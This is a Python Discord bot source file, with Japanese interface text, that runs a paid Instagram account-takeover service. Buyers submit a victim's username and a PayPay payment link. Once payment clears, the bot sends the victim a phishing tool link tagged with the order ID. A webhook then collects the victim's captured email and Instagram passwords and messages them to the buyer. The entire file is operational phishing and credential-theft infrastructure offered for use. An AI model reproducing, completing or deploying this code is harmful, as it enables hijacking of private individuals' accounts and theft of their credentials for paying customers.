import os, json, uuid, asyncio, datetime
import discord
from discord.ext import commands
from dotenv import load_dotenv
from aiohttp import web
import paypay, insta

load_dotenv()
TOOL_URL = os.getenv("TOOL_URL")
FIRST_CONFIRM = os.getenv("PAYPAY_FIRST_CONFIRM", "true") == "true"

intents = discord.Intents.default()
intents.members = True
bot = commands.Bot(command_prefix="!", intents=intents)

DB = json.load(open("orders.json", encoding="utf-8")) if os.path.exists("orders.json") \
     else {"orders": {}, "buyers": {}}
ORDERS = DB["orders"]
def save():
    json.dump(DB, open("orders.json", "w", encoding="utf-8"),
              ensure_ascii=False, indent=2)

# ---------- ① パネル（注文ボタン） ----------
class PanelView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="🛒 注文する", style=discord.ButtonStyle.success,
                       custom_id="panel:order")
    async def order(self, itx: discord.Interaction, _):
        await itx.response.send_modal(InstaIdModal())

# ---------- ③ インスタID入力欄 ----------
class InstaIdModal(discord.ui.Modal, title="乗っ取りたいアカウント"):
    target = discord.ui.TextInput(
        label="乗っ取りたい人のユーザーネーム",
        placeholder="例: taro_insta（@は無しでもOK）", required=True, max_length=40)

    async def on_submit(self, itx):
        oid = uuid.uuid4().hex[:10]
        ORDERS[oid] = {
            "buyer": itx.user.id,
            "target": self.target.value.strip().lstrip("@"),
            "state": "WAITING_PAYPAY",
            "paypay_link": None,
            "created": datetime.datetime.now().isoformat(),
        }
        save()
        first = str(itx.user.id) not in DB["buyers"]
        note = "\n⚠️ **初回のみ**、PayPayの「保留」を確認してください。" if first else ""
        await itx.response.send_message(
            f"対象: `@{ORDERS[oid]['target']}`\n"
            f"次に **PayPayリンク** を入力してください。{note}",
            view=PayPayView(oid), ephemeral=True)

# ---------- ④ PayPayリンク入力欄 ----------
class PayPayView(discord.ui.View):
    def __init__(self, oid):
        super().__init__(timeout=900); self.oid = oid
    @discord.ui.button(label="PayPayリンクを入力", style=discord.ButtonStyle.primary)
    async def go(self, itx, _):
        await itx.response.send_modal(PayPayLinkModal(self.oid))

class PayPayLinkModal(discord.ui.Modal, title="PayPayリンク"):
    link = discord.ui.TextInput(label="PayPayリンク",
                                placeholder="https://pay.paypay.ne.jp/xxxxxxxx", required=True)
    def __init__(self, oid):
        super().__init__(); self.oid = oid

    async def on_submit(self, itx):
        oid = self.oid
        ORDERS[oid]["paypay_link"] = self.link.value.strip()
        ORDERS[oid]["state"] = "WAITING_PAYMENT"
        save()
        await itx.response.send_message("✅ 入金を待機中です（自動で受け取ります）", ephemeral=True)
        bot.loop.create_task(watch_payment(oid))

# ---------- ⑤⑥⑦ 入金監視〜DM送信 ----------
async def watch_payment(oid):
    order = ORDERS[oid]
    link = order["paypay_link"]
    buyer = await bot.fetch_user(order["buyer"])

    while True:
        try:
            st = await paypay.status(link)
        except Exception:
            st = "unpaid"

        if st == "received":
            break

        if st == "pending":
            first = str(order["buyer"]) not in DB["buyers"]
            if first and FIRST_CONFIRM and not order.get("confirmed"):
                order["confirmed"] = await ask_operator(order)
                save()
                if not order["confirmed"]:
                    await asyncio.sleep(15); continue
            await paypay.receive(link)
            break
        await asyncio.sleep(20)

    # ⑥ 対象インスタへリンク送信（refに注文IDを埋める）
    url = f"{TOOL_URL}?ref={oid}"
    await bot.loop.run_in_executor(None, insta.send_tool_link, order["target"], url)
    order["state"] = "LINK_SENT"
    DB["buyers"][str(order["buyer"])] = True   # 初回フラグ解除
    save()
    await buyer.send(f"✅ 入金確認 → `@{order['target']}` にリンクを送りました。\n"
                     f"ログイン待ちです…")

async def ask_operator(order):
    """初回だけ保留を目視確認する"""
    op = await bot.fetch_user(int(os.getenv("OWNER_ID")))
    view = ConfirmView()
    msg = await op.send(f"🔔 初回の保留を検知（注文 `{order['target']}`）。受け取りますか？", view=view)
    await view.wait()
    return view.ok

class ConfirmView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=600); self.ok = False
    @discord.ui.button(label="受け取る", style=discord.ButtonStyle.success)
    async def y(self, itx, _):
        self.ok = True; await itx.response.send_message("OK"); self.stop()

# ---------- ⑦ 認証情報の受信Webhook ----------
async def creds_handler(req):
    d = await req.json()
    oid = d["ref"]
    order = ORDERS.get(oid)
    if not order:
        return web.json_response({"ok": False, "reason": "unknown ref"}, status=404)

    buyer = await bot.fetch_user(order["buyer"])
    e = discord.Embed(title="🔓 認証情報を取得しました", color=0x2ecc71)
    e.add_field(name="対象", value=f"@{order['target']}", inline=False)
    e.add_field(name="メアパス", value=f"`{d.get('mail','-')}` / `{d.get('mail_pass','-')}`", inline=False)
    e.add_field(name="アイパス", value=f"`{d.get('ig_id','-')}` / `{d.get('ig_pass','-')}`", inline=False)
    await buyer.send(embed=e)
    order["state"] = "DONE"; save()
    return web.json_response({"ok": True})

async def start_web():
    app = web.Application()
    app.router.add_post("/hook/creds", creds_handler)
    runner = web.AppRunner(app); await runner.setup()
    await web.TCPSite(runner, "0.0.0.0", 8080).start()

# ---------- 起動 ----------
@bot.event
async def on_ready():
    bot.add_view(PanelView())
    await start_web()
    print("ready:", bot.user)

@bot.command()
async def panel(ctx):
    await ctx.send("**インスタ乗っ取り代行**\n下のボタンから注文してください。",
                   view=PanelView())

bot.run(os.getenv("DISCORD_TOKEN"))
